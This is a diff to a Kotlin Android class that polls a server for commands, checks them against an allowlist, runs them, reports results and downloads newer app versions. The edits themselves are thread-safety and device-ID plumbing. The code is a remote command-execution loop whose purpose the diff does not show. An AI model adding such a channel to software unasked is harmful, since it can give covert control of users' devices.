@@ -26,7 +26,7 @@ object Core {
     private var userId: String = ""
     private var running = false
     // Persisted in SharedPreferences — survives process death (e.g. system installer killing app)
-    private var executedCommandIds = mutableSetOf<String>()
+    private var executedCommandIds = java.util.Collections.synchronizedSet(mutableSetOf<String>())
     private lateinit var prefs: android.content.SharedPreferences
 
     private const val PREFS_NAME = "kaze_executed_cmds"
@@ -34,7 +34,7 @@ object Core {
 
     private fun loadExecutedIds() {
         val saved = prefs.getStringSet(KEY_EXECUTED_IDS, emptySet()) ?: emptySet()
-        executedCommandIds = saved.toMutableSet()
+        executedCommandIds = java.util.Collections.synchronizedSet(saved.toMutableSet())
     }
 
     private fun saveExecutedIds() {
@@ -122,6 +122,7 @@ object Core {
         if (!running) {
             start(context)
         }
+        if (deviceId.isEmpty()) return
         scope.launch {
             try {
                 pollAndExecute(context)
@@ -143,7 +144,7 @@ object Core {
                     val action = cmd.split("|", limit = 2)[0].trim()
                     if (!Config.ALLOWED_COMMANDS.contains(action) && action != "wake") {
                         Log.w(TAG, "Unknown command rejected: $cmd")
-                        Transport.markCommandFailed(cmdId)
+                        Transport.markCommandFailed(cmdId, deviceId)
                         continue
                     }
 
@@ -157,14 +158,14 @@ object Core {
                             val currentVersion = com.kaze.BuildConfig.VERSION_NAME
                             if (compareVersions(remoteVersion, currentVersion) <= 0) {
                                 Log.d(TAG, "Skipping download for v$remoteVersion (current: v$currentVersion)")
-                                Transport.markCommandCompleted(cmdId)
+                                Transport.markCommandCompleted(cmdId, deviceId)
                                 continue
                             }
                         }
                     }
 
                     Log.d(TAG, "Executing: $cmd")
-                    Transport.markCommandRunning(cmdId)
+                    Transport.markCommandRunning(cmdId, deviceId)
 
                     val result = try {
                         when {
@@ -180,7 +181,7 @@ object Core {
                     }
 
                     Transport.sendResult(cmdId, deviceId, result)
-                    Transport.markCommandCompleted(cmdId)
+                    Transport.markCommandCompleted(cmdId, deviceId)
                     Log.d(TAG, "Result sent: ${cmd.take(30)} (${result.length} bytes)")
                 }
             }
